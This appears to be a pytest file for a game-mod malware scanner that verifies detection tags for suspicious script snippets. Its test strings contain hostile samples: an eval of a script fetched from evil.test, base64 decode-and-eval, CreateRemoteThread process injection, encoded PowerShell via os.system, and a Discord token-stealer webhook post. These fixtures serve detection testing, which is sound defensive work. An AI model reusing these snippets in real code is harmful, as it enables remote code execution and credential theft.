import pytest

from Virus_Scan.orchestration.bootstrap_initialization import initialize_runtime


@pytest.fixture(scope="module", autouse=True)
def _initialize_stage_game_engine_runtime() -> None:
    initialize_runtime()

from Virus_Scan.detection.api.chain_evaluation import evaluate_chain_evidence
from Virus_Scan.tests.support.canonical_chain_fixtures import physical_tag_evidence
from Virus_Scan.heuristics import evaluate_script_execution
from Virus_Scan.detection.enrichment.strings.contextual.scan import ContextualTagScanRequest, contextual_tag_scan


def test_rpgm_eval_atob_publishes_atomic_decode_and_execution_evidence():
    tags = set(contextual_tag_scan(ContextualTagScanRequest("var s=atob('AAAA'); eval(s);", path="www/js/plugins/evil.js")))
    assert "payload_decode_candidate" in tags
    assert "payload_execution" in tags
    assert "js_decode_execute_chain" not in tags


def test_rpgm_xhr_eval_publishes_atomic_network_execution_evidence():
    blob = "var x=new XMLHttpRequest(); x.open('GET','https://evil.test/p.js'); x.onload=function(){ eval(x.responseText); };"
    tags = set(contextual_tag_scan(ContextualTagScanRequest(blob, path="www/js/plugins/evil.js")))
    assert "rpgm_js_network_exec_candidate" in tags
    assert "process_exec" in tags
    assert "network_activity" in tags
    assert "download_execute_chain" not in tags


def test_unity_native_injection_family_publishes_canonical_candidate():
    blob = "[DllImport('kernel32')] VirtualAlloc(); CreateRemoteThread(); UnityEngine;"
    tags = set(contextual_tag_scan(ContextualTagScanRequest(blob, path="Assets/Scripts/NativeInject.cs")))
    assert "injection_api_chain" not in tags
    assert "process_injection" in tags
    evidence = evaluate_chain_evidence(tags=physical_tag_evidence(tuple(sorted(tags))))
    decision = next(
        item for item in evidence.decisions
        if item.candidate.chain_id == "anchor:process_injection_chain"
    )
    assert decision.status == "candidate"


def test_renpy_os_system_encoded_powershell_chain():
    tags = set(contextual_tag_scan(ContextualTagScanRequest("import os\nos.system('powershell -enc AAAA')", path="game/evil.rpy")))
    assert "powershell_exec" in tags
    assert "script_to_process_chain" not in tags
    evidence = evaluate_chain_evidence(tags=physical_tag_evidence(tuple(sorted(tags))))
    decision = next(
        item for item in evidence.decisions
        if item.candidate.chain_id == "anchor:encoded_powershell_weak"
    )
    assert decision.status == "confirmed"


def test_token_stealer_webhook_chain():
    blob = "discord token authorization access_token requests.post('https://discord.com/api/webhooks/1/2')"
    tags = set(contextual_tag_scan(ContextualTagScanRequest(blob, path="game/token_stealer.rpy")))
    assert "token_exfiltration" in tags
    assert "high_confidence_credential_theft" in tags


def test_central_script_registry_uses_canonical_tags():
    out = evaluate_script_execution("powershell -enc AAAA", source="game/evil.rpy")
    assert "powershell_exec" in out["tags"]
    assert "encoded_powershell" in out["tags"]
